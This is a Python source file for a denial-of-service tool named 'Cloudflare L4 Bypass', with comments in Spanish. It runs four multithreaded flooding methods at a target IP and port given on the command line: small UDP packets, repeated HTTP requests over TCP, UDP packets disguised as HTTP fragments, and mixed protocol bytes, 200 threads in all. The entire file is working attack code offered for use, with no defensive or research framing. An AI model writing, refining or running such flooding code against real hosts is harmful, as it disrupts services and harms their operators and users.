import socket
import random
import sys
import time
import threading

class CloudflareBypassL4:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        
    def udp_small_packets(self):
        """UDP con paquetes muy pequeños"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        tiny_payloads = [
            b'\x00', b'\x01', b'\xff', 
            b'\x16', b'\x13', b'\x03',
            b'G', b'P', b'H', b'O',
            b'\x00\x00', b'\x01\x00',
            b'\xff\xff', b'\x80\x00',
            random._urandom(1),
            random._urandom(2),
        ]
        
        timeout = time.time() + self.duration
        while time.time() < timeout and self.running:
            try:
                for _ in range(100):
                    payload = random.choice(tiny_payloads)
                    sock.sendto(payload, (self.target_ip, self.target_port))
                time.sleep(0.001)
            except:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.close()
    
    def tcp_http_flood(self):
        """TCP HTTP/1.1 flood"""
        timeout = time.time() + self.duration
        
        while time.time() < timeout and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Conectar
                sock.connect((self.target_ip, self.target_port))
                
                # Enviar múltiples requests HTTP
                requests = [
                    f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n",
                    f"POST / HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: 0\r\n\r\n",
                    f"HEAD / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n",
                ]
                
                for _ in range(10):
                    request = random.choice(requests)
                    sock.send(request.encode())
                    time.sleep(0.01)
                
                sock.close()
                
            except:
                time.sleep(0.1)
    
    def udp_http_fake(self):
        """UDP que parece HTTP (para confundir)"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        http_fragments = [
            b"GET / ",
            b"POST /",
            b"HTTP/1",
            b"Host: ",
            b"\r\n\r\n",
            b"User-Agent:",
            b"Accept: ",
        ]
        
        timeout = time.time() + self.duration
        while time.time() < timeout and self.running:
            try:
                # Mezclar fragmentos HTTP
                for _ in range(50):
                    fragment = random.choice(http_fragments)
                    # Añadir datos aleatorios
                    if random.random() < 0.5:
                        fragment += random._urandom(random.randint(1, 5))
                    sock.sendto(fragment, (self.target_ip, self.target_port))
                time.sleep(0.001)
            except:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.close()
    
    def mixed_protocol_flood(self):
        """Mezcla varios protocolos"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Bytes de diferentes protocolos
        protocol_bytes = [
            # TLS/SSL
            b'\x16\x03', b'\x13\x00', b'\x03\x03',
            # DNS
            b'\x00', b'\x01', b'\x80',
            # HTTP
            b'GET', b'POST', b'HTTP',
            # Random
            random._urandom(1), random._urandom(2),
        ]
        
        timeout = time.time() + self.duration
        while time.time() < timeout and self.running:
            try:
                for _ in range(200):
                    payload = random.choice(protocol_bytes)
                    sock.sendto(payload, (self.target_ip, self.target_port))
                time.sleep(0.001)
            except:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.close()
    
    def start_attack(self):
        """Iniciar todos los métodos de ataque"""
        print(f"[+] Cloudflare L4 Bypass Attack")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Duration: {self.duration}s")
        print("[+] Methods: UDP Small + TCP HTTP + UDP HTTP Fake + Mixed")
        
        # Métodos de ataque
        methods = [
            self.udp_small_packets,
            self.tcp_http_flood,
            self.udp_http_fake,
            self.mixed_protocol_flood,
        ]
        
        # Crear hilos (50 por método)
        threads = []
        for method in methods:
            for _ in range(50):
                t = threading.Thread(target=method)
                t.daemon = True
                t.start()
                threads.append(t)
        
        # Ejecutar por duración
        time.sleep(self.duration)
        
        # Detener
        self.running = False
        time.sleep(2)
        print("[+] Attack completed")

def main():
    if len(sys.argv) != 4:
        print("Usage: cf_l4_bypass.py <ip> <port> <time>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    attack = CloudflareBypassL4(target_ip, target_port, duration)
    attack.start_attack()

if __name__ == "__main__":
    main()
